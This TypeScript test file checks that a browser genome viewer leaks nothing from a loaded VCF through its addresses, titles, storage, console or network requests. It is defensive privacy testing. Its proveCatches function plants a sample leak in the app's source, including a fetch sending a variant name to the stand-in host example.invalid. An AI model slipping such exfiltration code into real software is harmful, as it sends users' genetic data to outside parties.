// Copyright 2026 Ashwin Mukherjee
// SPDX-License-Identifier: PolyForm-Noncommercial-1.0.0
// P1: a real genome through the real picker, every room opened, then every exit searched for anything from the file.

import { createHash } from "node:crypto";
import { existsSync, readFileSync, writeFileSync } from "node:fs";
import { createServer, request, type IncomingHttpHeaders } from "node:http";
import { connect } from "node:net";
import { basename, resolve } from "node:path";
import type { Page, Protocol } from "puppeteer-core";
import type { GenomeResult, Manifest } from "../../src/contracts/app";
import type { Result } from "../checks/_check";
import { PATHS } from "../spine/paths";
import { build, freePort, openBrowser, openPage, serve } from "./browser";
import { act, actOnceThere, frames, hashOf, NAME, roomAtRest, ROOT, sleep, tally } from "./shell";

export const GENOME = resolve(PATHS.raw, "giab/HG002_GRCh38_1_22_v4.2.1_benchmark.vcf.gz");
/** What the app read from that file, as the reader gives it: the needles are taken from here. */
const EXPECTED = resolve(ROOT, "test/fixtures/hg002.result.json");

interface Seen {
  method: string;
  url: string;
  headers: IncomingHttpHeaders;
  body: string;
}

/** Every request the browser makes, from any page or worker, passes this proxy: the one complete record of what left. */
async function recorder(app: string): Promise<{ port: number; seen: Seen[]; stop(): void }> {
  const target = new URL(app);
  const targetPort = Number(target.port || (target.protocol === "https:" ? 443 : 80));
  const seen: Seen[] = [];
  const server = createServer((req, res) => {
    req.on("error", () => res.destroy());
    res.on("error", () => undefined);
    const chunks: Buffer[] = [];
    req.on("data", (c: Buffer) => chunks.push(c));
    req.on("end", () => {
      const body = Buffer.concat(chunks);
      const url = req.url ?? "";
      seen.push({ method: req.method ?? "", url, headers: req.headers, body: body.toString("latin1") });
      let u: URL;
      try {
        u = new URL(url);
      } catch {
        res.writeHead(400).end();
        return;
      }
      // Nothing goes on to another host: the test has no network, and any attempt is already recorded.
      if (u.host !== target.host) {
        res.writeHead(502).end();
        return;
      }
      const up = request(
        { hostname: u.hostname, port: u.port, path: u.pathname + u.search, method: req.method, headers: req.headers },
        (r) => {
          res.writeHead(r.statusCode ?? 502, r.headers);
          r.pipe(res);
        },
      );
      up.on("error", () => res.writeHead(502).end());
      up.end(body);
    });
  });
  // A socket the browser drops mid-request is no finding of the test's.
  const quiet = () => undefined;
  server.on("clientError", (_e, socket) => socket.destroy());
  server.on("connect", (req, socket) => {
    socket.on("error", quiet);
    seen.push({ method: "CONNECT", url: req.url ?? "", headers: req.headers, body: "" });
    // The dev server's reload socket, or a live site's HTTPS, asks for a tunnel to the app itself; nothing else gets one.
    if (req.url !== target.host && req.url !== `${target.hostname}:${targetPort}`)
      return void socket.end("HTTP/1.1 502 Bad Gateway\r\n\r\n");
    const up = connect(targetPort, target.hostname, () => {
      socket.write("HTTP/1.1 200 Connection Established\r\n\r\n");
      socket.pipe(up).pipe(socket);
    });
    up.on("error", () => socket.destroy());
  });
  // The dev server's reload socket: recorded like the rest, and let through to the same host only.
  server.on("upgrade", (req, socket, head) => {
    socket.on("error", quiet);
    seen.push({ method: "UPGRADE", url: req.url ?? "", headers: req.headers, body: "" });
    const u = new URL(req.url ?? "", app);
    if (u.host !== target.host) return void socket.destroy();
    const up = connect(Number(u.port), u.hostname, () => {
      const lines = [`${req.method} ${u.pathname}${u.search} HTTP/1.1`];
      for (let i = 0; i < req.rawHeaders.length; i += 2) lines.push(`${req.rawHeaders[i]}: ${req.rawHeaders[i + 1]}`);
      up.write(`${lines.join("\r\n")}\r\n\r\n`);
      up.write(head);
      socket.pipe(up).pipe(socket);
    });
    up.on("error", () => socket.destroy());
    socket.on("error", () => up.destroy());
  });
  const port = await freePort();
  await new Promise<void>((done) => server.listen(port, "127.0.0.1", done));
  return { port, seen, stop: () => void server.close() };
}

interface Needle {
  text: string;
  what: string;
  /** A short number: matched as a whole token, and not in the browser's own headers, where versions and sizes live. */
  short: boolean;
}

/** Everything that would say something about the file: each finding's gene, keys, position, names; the counts; the file's name. */
export function needles(r: GenomeResult, file: string): Needle[] {
  const out = new Map<string, Needle>();
  const add = (text: string | number | null | undefined, what: string) => {
    const t = String(text ?? "").trim();
    if (!t || out.has(t)) return;
    out.set(t, { text: t, what, short: /^\d{1,3}$/.test(t) });
  };
  for (const f of [...r.yours, ...r.carriers]) {
    const id = f.bundle.identity;
    add(id.gene, "gene");
    add(f.key, "key");
    add(id.normalized_key, "normalized key");
    add(f.p23.key, "key");
    add(id.normalized_key.split(":")[1], "position");
    add(id.hgvs_c, "HGVS c.");
    if (typeof id.hgvs_p === "string") add(id.hgvs_p, "HGVS p.");
    add(f.name, "variant name");
  }
  for (const [k, v] of Object.entries(r.counts)) add(v, `count ${k}`);
  add(basename(file).replace(/\.vcf(\.gz)?$/i, ""), "file name");
  return [...out.values()];
}

const escape = (s: string) => s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
function hits(ns: Needle[], where: string, text: string, headers = false): string[] {
  const found: string[] = [];
  for (const n of ns) {
    if (n.short && headers) continue;
    const re = new RegExp(`(?<![A-Za-z0-9])${escape(n.text)}(?![A-Za-z0-9])`);
    if (re.test(text)) found.push(`${where}: the ${n.what} "${n.text}" in ${JSON.stringify(text.slice(0, 160))}`);
  }
  return found;
}

/** Routes a file may stand at: no names and no numbers (router.ts). A room's place lives in the router's memory,
 *  never the address or the history entry, so the whole address is searched. */
const FILE_ROUTE = /^#\/(read\/(loading|all|coding|protein|rare|yours)|list(\/carriers)?|genes|variant|carrier)?$/;

/** Every exit the page could write to, read from inside it. */
async function exits(page: Page) {
  return page.evaluate(async () => {
    const local = Object.entries(localStorage);
    const session = Object.entries(sessionStorage);
    const idb: string[] = [];
    for (const d of await indexedDB.databases()) {
      idb.push(`database ${d.name}`);
      const db = await new Promise<IDBDatabase>((ok, no) => {
        const q = indexedDB.open(d.name ?? "");
        q.onsuccess = () => ok(q.result);
        q.onerror = () => no(q.error);
      });
      for (const store of db.objectStoreNames) {
        const all = await new Promise<unknown[]>((ok) => {
          const q = db.transaction(store).objectStore(store).getAll();
          q.onsuccess = () => ok(q.result);
          q.onerror = () => ok([]);
        });
        idb.push(`${store}: ${JSON.stringify(all)}`);
      }
      db.close();
    }
    const cache: string[] = [];
    for (const k of await caches.keys()) {
      cache.push(k);
      for (const req of await (await caches.open(k)).keys()) cache.push(req.url);
    }
    const opfs: string[] = [];
    try {
      const root = await navigator.storage.getDirectory();
      for await (const name of (root as unknown as { keys(): AsyncIterable<string> }).keys()) opfs.push(name);
    } catch {
      // No private file system in this browser: nothing can have been written there.
    }
    const workers = (await navigator.serviceWorker?.getRegistrations())?.map((r) => r.scope) ?? [];
    return {
      local,
      session,
      idb,
      cache,
      opfs,
      workers,
      cookie: document.cookie,
      title: document.title,
      href: location.href,
    };
  });
}

/** The console lines the dev tools themselves write, never the app. */
const TOOLING = /^\[vite\]|Download the React DevTools/;

interface Walk {
  /** The served app. */
  url: string;
  label: string;
  /** Planted copies are expected to be caught: each of these exits must report a hit. */
  expectCaught?: string[];
  /** A deployed site over HTTPS: the proxy sees only its tunnel, so what was sent is read inside Chrome; and these
   *  headers (an Access service token) go with every request of the page's and its workers'. */
  live?: { headers: Record<string, string> };
}

async function walk(w: Walk): Promise<{ failures: string[]; asserted: number; caught: Set<string>; notes: string[] }> {
  const t = tally();
  const caught = new Set<string>();
  const notes: string[] = [];
  const result = JSON.parse(readFileSync(EXPECTED, "utf8")) as GenomeResult;
  const ns = needles(result, GENOME);
  const manifest = JSON.parse(readFileSync(resolve(ROOT, "public/data/manifest.json"), "utf8")) as Manifest;

  const proxy = await recorder(w.url);
  const { browser, close } = await openBrowser([
    `--proxy-server=http://127.0.0.1:${proxy.port}`,
    // Loopback too: the app's own requests are the ones under test.
    "--proxy-bypass-list=<-loopback>",
    "--disable-background-networking",
    "--disable-component-update",
    "--disable-sync",
    "--disable-default-apps",
    "--no-pings",
  ]);
  const consoleLines: string[] = [];
  const titles = new Set<string>();
  const urls = new Set<string>();
  try {
    const { page, errors } = await openPage(browser, "desktop");
    if (w.live) await page.setExtraHTTPHeaders(w.live.headers);
    page.on("console", (m) => consoleLines.push(`page ${m.type()}: ${m.text()}`));
    // What the page and its workers sent, as the browser saw it: the proxy also carries Chrome's own traffic,
    // and over HTTPS sees only a tunnel's host. Keyed by the request's id: a worker's request can be told on the
    // page's session as well as its own.
    const byId = new Map<string, Seen>();
    const record = (e: Protocol.Network.RequestWillBeSentEvent) =>
      void byId.set(e.requestId, { method: e.request.method, url: e.request.url, headers: e.request.headers, body: e.request.postData ?? "" }); // prettier-ignore
    const own = await page.createCDPSession();
    own.on("Network.requestWillBeSent", record);
    await own.send("Network.enable");
    page.on("workercreated", (worker) => {
      worker.on("console", (m) => consoleLines.push(`worker ${m.type()}: ${m.text()}`));
      worker.client.on("Network.requestWillBeSent", record);
      void worker.client.send("Network.enable").catch(() => undefined);
      if (w.live)
        void worker.client.send("Network.setExtraHTTPHeaders", { headers: w.live.headers }).catch(() => undefined);
    });
    const sentNow = () => [...byId.values()];
    const asked = () => sentNow().map((r) => r.url);
    page.on("framenavigated", (f) => {
      if (f === page.mainFrame()) urls.add(f.url());
    });
    const step = async () => {
      titles.add(await page.title());
      urls.add(page.url());
    };

    // A dev server may optimize its dependencies on the first visit and reload the page: let it, then start.
    await page.goto(`${w.url}/#/`, { waitUntil: "networkidle0" });
    await sleep(3000);
    await page.reload({ waitUntil: "networkidle0" });
    await page.evaluate(() => document.fonts.ready);
    await step();
    // Machine translation would send the page, variants and all, to a server: the page refuses it.
    t.ok(
      await page.evaluate(
        () =>
          !document.documentElement.translate && !!document.querySelector('meta[name="google"][content="notranslate"]'),
      ),
      `${w.label}: the page may be machine-translated`,
    );

    // ── The real picker: LOAD YOUR GENOME, the opt-in answered, the file chosen ──
    t.ok(await act(page, /load your genome/i), `${w.label}: the landing offers no way to load a genome`);
    const chooser = page.waitForFileChooser({ timeout: 8000 }).catch(() => null);
    t.ok(await actOnceThere(page, /include them/i), `${w.label}: the opt-in question has no answer`);
    const picker = await chooser;
    t.ok(!!picker, `${w.label}: answering the question opened no file picker`);
    if (!picker)
      throw new Error(
        `no picker: ${t.failures.join(" | ")} ${errors.join(" | ").slice(0, 600)} | ${(await page.evaluate(() => document.body.innerText)).slice(0, 300)}`,
      );
    await picker.accept([GENOME]);
    const started = Date.now();

    // ── The descent: NEXT until EXPLORE, EXPLORE to the list ──
    for (let i = 0; i < 20 && !(await hashOf(page)).startsWith("#/list"); i++) {
      await step();
      if (await act(page, /^\s*explore/i)) continue;
      if (await actOnceThere(page, /^\s*next\s*(→)?\s*$/i, false, i === 0 ? 300_000 : 15_000)) continue;
      if (await actOnceThere(page, /^\s*explore/i, false, 5000)) continue;
    }
    await step();
    notes.push(`${w.label}: read and descended in ${Math.round((Date.now() - started) / 1000)} s`);
    t.ok((await hashOf(page)) === "#/list", `${w.label}: the descent ended at ${await hashOf(page)}, not the list`);
    await page.waitForSelector(".list-row", { timeout: 15_000 }).catch(() => undefined);

    // The needles are only worth searching for if the page really holds them.
    const shown = await page.evaluate(() => document.body.innerText);
    const yoursGenes = [...new Set(result.yours.map((f) => f.bundle.identity.gene))];
    const missing = yoursGenes.filter((g) => !shown.includes(g));
    t.ok(
      missing.length === 0,
      `${w.label}: the list does not show ${missing.join(", ")}: the needles are not this read's`,
    );

    // ── Every room, in each list, by NEXT VARIANT ──
    const rooms = async (which: "yours" | "carriers") => {
      const n = result.counts[which];
      const first = await page.$(".list-row");
      t.ok(!!first, `${w.label}: the ${which} list has no row`);
      if (!first) return;
      await first.click();
      await frames(page);
      const word = which === "yours" ? "variant" : "carrier";
      for (let i = 1; i <= n; i++) {
        t.ok(await roomAtRest(page, 20_000), `${w.label}: room ${word} ${i} never came to rest`);
        await step();
        const h = await hashOf(page);
        t.ok(h === `#/${word}`, `${w.label}: room ${i} of ${which} stands at ${h}`);
        // The room's place is the router's, in memory: NEXT VARIANT moves on though the address stays the same,
        // and the history entry, which the browser writes to its session-restore files, holds only its depth.
        const place = await page.evaluate(() => ({
          open: [...document.querySelectorAll(".list-row")].findIndex((r) => r.classList.contains("is-current")),
          state: Object.keys((window.history.state as object | null) ?? {}).join(","),
        }));
        t.ok(place.open === i - 1, `${w.label}: room ${i} of ${which} shows row ${place.open + 1}`);
        t.ok(place.state === "depth", `${w.label}: room ${i} of ${which}'s history entry holds ${place.state}`);
        if (i === n) break;
        // NEXT VARIANT lands only once the room has been read to its end.
        await page.evaluate(() => {
          const room = document.querySelector(".room");
          room?.scrollTo({ top: room.scrollHeight });
        });
        await sleep(600);
        t.ok(await actOnceThere(page, /next variant/i, false, 8000), `${w.label}: room ${h} has no NEXT VARIANT`);
      }
      await page.keyboard.press("Escape");
      await frames(page);
      await sleep(600);
      await step();
    };
    await rooms("yours");
    if (!(await hashOf(page)).startsWith("#/list")) await page.goBack().catch(() => undefined);
    t.ok(await actOnceThere(page, /^\s*carriers/i, false, 8000), `${w.label}: the list offers no way to the carriers`);
    await sleep(800);
    await step();
    t.ok((await hashOf(page)) === "#/list/carriers", `${w.label}: CARRIERS led to ${await hashOf(page)}`);
    await rooms("carriers");

    // ── The genes page, by the count the descent's second cut names: its one way in with a file read ──
    await page.evaluate(() => (location.hash = "#/read/coding"));
    await sleep(1200);
    t.ok(
      await actOnceThere(page, /^\s*[\d,]+ genes\s*$/i, false, 8000),
      `${w.label}: the second cut offers no way to the genes page`,
    );
    await sleep(1200);
    await step();
    t.ok((await hashOf(page)) === "#/genes", `${w.label}: the genes count led to ${await hashOf(page)}`);
    await sleep(1500);

    // ── Search every exit ──
    const fail = (exit: string, found: string[]) => {
      if (found.length) caught.add(exit);
      for (const f of found) t.ok(false, `${w.label}: ${f}`);
      t.ok(true, exit);
    };
    const cdp = await page.createCDPSession();
    const history = (await cdp.send("Page.getNavigationHistory")) as {
      entries: { url: string; title: string }[];
    };
    for (const e of history.entries) {
      urls.add(e.url);
      titles.add(e.title);
    }
    for (const u of urls) {
      const hash = new URL(u).hash || "#/";
      if (u.startsWith(w.url) && !FILE_ROUTE.test(hash)) {
        caught.add("url");
        t.ok(false, `${w.label}: the address ${hash} is not one a file's read may stand at`);
      }
      fail("url", hits(ns, "the address or a history entry", u));
    }
    for (const title of titles) {
      if (title !== NAME) {
        caught.add("title");
        t.ok(false, `${w.label}: the tab read "${title}"`);
      }
      fail("title", hits(ns, "the tab title", title));
    }
    const out = await exits(page);
    fail("storage", hits(ns, "localStorage", JSON.stringify(out.local)));
    fail("storage", hits(ns, "sessionStorage", JSON.stringify(out.session)));
    fail("storage", hits(ns, "IndexedDB", out.idb.join("\n")));
    fail("storage", hits(ns, "the Cache API", out.cache.join("\n")));
    fail("storage", hits(ns, "the private file system", out.opfs.join("\n")));
    fail("storage", hits(ns, "document.cookie", out.cookie));
    const cookies = (await cdp.send("Network.getAllCookies")) as { cookies: unknown[] };
    fail("storage", hits(ns, "the browser's cookies", JSON.stringify(cookies.cookies)));
    // The Cache API may hold the fixed data, the same for everyone, and nothing else.
    const fixed = new Set(["manifest.json", ...manifest.files.map((f) => f.path)]);
    // The cache is named by the files' digests (data/store.ts), the same name for everyone with this manifest.
    const name = `pack-${createHash("sha256").update(manifest.files.map((f) => f.sha256).join()).digest("hex").slice(0, 16)}`; // prettier-ignore
    const cached = out.cache.filter(
      (k) => k !== name && !(k.startsWith(`${w.url}/data/`) && fixed.has(k.slice(w.url.length + 6))),
    );
    for (const [what, list] of [
      ["localStorage", out.local],
      ["sessionStorage", out.session],
      ["IndexedDB", out.idb],
      ["the Cache API", cached],
      ["the private file system", out.opfs],
      ["a service worker", out.workers],
      ["cookies", cookies.cookies],
    ] as const)
      t.ok(list.length === 0, `${w.label}: ${what} holds ${JSON.stringify(list).slice(0, 200)}`);
    for (const line of consoleLines) fail("console", hits(ns, "the console", line));
    const ours = consoleLines.filter((l) => !TOOLING.test(l.replace(/^\w+ \w+: /, "")));
    if (ours.length) caught.add("console");
    t.ok(ours.length === 0, `${w.label}: the console has lines of the app's:\n${ours.slice(0, 6).join("\n")}`);
    t.ok(errors.length === 0, `${w.label}: the page logged errors:\n${errors.slice(0, 6).join("\n")}`);

    // ── Every request: its address, headers and body; data requests exactly the manifest's list, no other host ──
    const origin = new URL(w.url);
    const data: string[] = [];
    const background = new Set<string>();
    for (const u of asked()) {
      let host = "";
      try {
        host = new URL(u).host;
      } catch {
        host = u;
      }
      if (host === origin.host || u.startsWith("data:") || u.startsWith("blob:")) continue;
      caught.add("request");
      t.ok(false, `${w.label}: the page asked for something from another host: ${u}`);
    }
    for (const r of proxy.seen) {
      fail("request", hits(ns, `${r.method} ${r.url}`, r.url));
      fail("request", hits(ns, `the body of ${r.method} ${r.url}`, r.body));
      fail("request", hits(ns, `the headers of ${r.url}`, JSON.stringify(r.headers), true));
      let host = r.url;
      try {
        host = new URL(r.method === "CONNECT" ? `https://${r.url}` : r.url).host;
      } catch {
        // Recorded as it came.
      }
      if (host !== origin.host) {
        // A request the page made says where it came from; Chrome's own (its clock, its account, its updates) does not.
        const fromPage = [r.headers.origin, r.headers.referer].some((h) => String(h ?? "").startsWith(w.url));
        if (fromPage) {
          caught.add("request");
          t.ok(false, `${w.label}: the page sent a request to another host: ${r.method} ${r.url}`);
        } else background.add(host);
        continue;
      }
      t.ok(["GET", "UPGRADE", "CONNECT"].includes(r.method), `${w.label}: a ${r.method} request to ${r.url}`);
      if (w.live) continue;
      const path = new URL(r.url).pathname;
      if (path.startsWith("/data/")) data.push(path.slice("/data/".length));
    }
    // What the page and its workers sent, read inside Chrome: the same search, and on a live site the only one.
    const sent = sentNow();
    for (const r of sent) {
      fail("request", hits(ns, `${r.method} ${r.url}`, r.url));
      fail("request", hits(ns, `the body of ${r.method} ${r.url}`, r.body));
      fail("request", hits(ns, `the headers of ${r.url}`, JSON.stringify(r.headers), true));
      if (!w.live || r.url.startsWith("data:") || r.url.startsWith("blob:")) continue;
      t.ok(r.method === "GET", `${w.label}: a ${r.method} request to ${r.url}`);
      const u = new URL(r.url);
      if (u.host === origin.host && u.pathname.startsWith("/data/")) data.push(u.pathname.slice("/data/".length));
    }
    const extra = [...new Set(data)].filter((p) => !fixed.has(p));
    const absent = [...fixed].filter((p) => !data.includes(p));
    if (extra.length) caught.add("request");
    t.ok(extra.length === 0, `${w.label}: data requests outside the manifest's list: ${extra.join(", ")}`);
    t.ok(absent.length === 0, `${w.label}: the manifest's files never requested: ${absent.join(", ")}`);
    const twice = data.filter((p, i) => data.indexOf(p) !== i);
    notes.push(
      `${w.label}: ${proxy.seen.length} requests, ${data.length} to /data/ (the manifest and its ${manifest.files.length} files), ${urls.size} addresses, ${consoleLines.length} console lines (${consoleLines.length - ours.length} the dev tools'), ${ns.length} needles`,
      `${w.label}: asked twice: ${twice.join(", ") || "nothing"}; the page and its workers asked ${sent.length} times; Chrome's own traffic, not the page's: ${[...background].join(", ") || "none"}`,
    );

    // ── Leaving and coming back: the back/forward cache must not bring the read back ──
    await page.goto(`${w.url}/credits.txt`, { waitUntil: "load" });
    await page.goBack({ waitUntil: "load" });
    await sleep(2000);
    const back = await page.evaluate(
      (name) => ({
        rows: document.querySelectorAll(".list-row").length,
        named: !!name && (document.querySelector(".ledger-name")?.textContent ?? "").includes(name),
      }),
      result.displayName ?? "",
    );
    t.ok(
      back.rows === 0 && !back.named,
      `${w.label}: Back after leaving the site shows the read again: ${JSON.stringify(back)}`,
    );
    await page.close();
  } finally {
    await close();
    proxy.stop();
  }
  for (const e of w.expectCaught ?? []) notes.push(`${w.label}: plant caught at ${e}: ${caught.has(e)}`);
  return { failures: t.failures, asserted: t.asserted, caught, notes };
}

/** The dev server and the built preview, both walked; nothing found on either. */
export async function run(modes: readonly ("dev" | "preview")[] = ["dev", "preview"]): Promise<Result> {
  if (!existsSync(GENOME)) return { ok: false, detail: `the benchmark is not at ${GENOME}` };
  const failures: string[] = [];
  const notes: string[] = [];
  let asserted = 0;
  for (const mode of modes) {
    if (mode === "preview") build();
    const server = await serve(mode);
    try {
      const r = await walk({ url: server.url, label: mode });
      failures.push(...r.failures);
      notes.push(...r.notes);
      asserted += r.asserted;
    } finally {
      server.stop();
    }
  }
  return {
    ok: failures.length === 0,
    detail: [...failures, ...notes, `${asserted} asserts, ${failures.length} failed`].join("\n"),
  };
}

/** The three leaks the test exists for, planted where the result arrives in a scratch copy of the app. */
const PLANT = `
      // A planted leak: the leak test must catch each of these.
      {
        const f = view.result.yours[0];
        if (f) {
          console.log(f.key);
          void fetch("/data/" + f.bundle.identity.gene + ".pack");
          history.replaceState(history.state, "", location.href + "-" + f.bundle.identity.gene);
          void fetch("https://example.invalid/" + f.name).catch(() => undefined);
        }
      }
`;

/** Plant the leaks in this tree for one walk, then put the file back as it was: every planted exit must be caught. */
export async function proveCatches(): Promise<Result> {
  const shell = resolve(ROOT, "src/app/shell/Shell.tsx");
  const src = readFileSync(shell, "utf8");
  const at = src.indexOf('dispatch({ type: "result", source, result: view.result });');
  if (at < 0) return { ok: false, detail: "the plant's anchor is gone from Shell.tsx" };
  writeFileSync(shell, src.slice(0, at) + PLANT + src.slice(at));
  try {
    const server = await serve("dev");
    try {
      const want = ["url", "console", "request"];
      const r = await walk({ url: server.url, label: "planted", expectCaught: want });
      const missed = want.filter((e) => !r.caught.has(e));
      return {
        ok: missed.length === 0 && r.failures.length > 0,
        detail: [
          missed.length ? `the plant was NOT caught at: ${missed.join(", ")}` : "every planted leak was caught",
          ...r.failures.slice(0, 16),
          ...r.notes,
        ].join("\n"),
      };
    } finally {
      server.stop();
    }
  } finally {
    writeFileSync(shell, src);
  }
}

/** The walk on a deployed site behind Cloudflare Access, through a service token (CF_ACCESS_CLIENT_ID and _SECRET). */
export async function runLive(url: string): Promise<Result> {
  if (!existsSync(GENOME)) return { ok: false, detail: `the benchmark is not at ${GENOME}` };
  const id = process.env.CF_ACCESS_CLIENT_ID;
  const secret = process.env.CF_ACCESS_CLIENT_SECRET;
  if (!id || !secret) return { ok: false, detail: "set CF_ACCESS_CLIENT_ID and CF_ACCESS_CLIENT_SECRET (.env)" };
  const r = await walk({
    url: url.replace(/\/$/, ""),
    label: "live",
    live: { headers: { "CF-Access-Client-Id": id, "CF-Access-Client-Secret": secret } },
  });
  return {
    ok: r.failures.length === 0,
    detail: [...r.failures, ...r.notes, `${r.asserted} asserts, ${r.failures.length} failed`].join("\n"),
  };
}

if (import.meta.url === `file://${process.argv[1]}`) {
  const live = process.argv.indexOf("--live");
  const r = process.argv.includes("--plant")
    ? await proveCatches()
    : live > 0
      ? await runLive(process.argv[live + 1] ?? "")
      : await run(process.argv.includes("--dev") ? ["dev"] : undefined);
  console.log(r.detail);
  process.exitCode = r.ok ? 0 : 1;
}
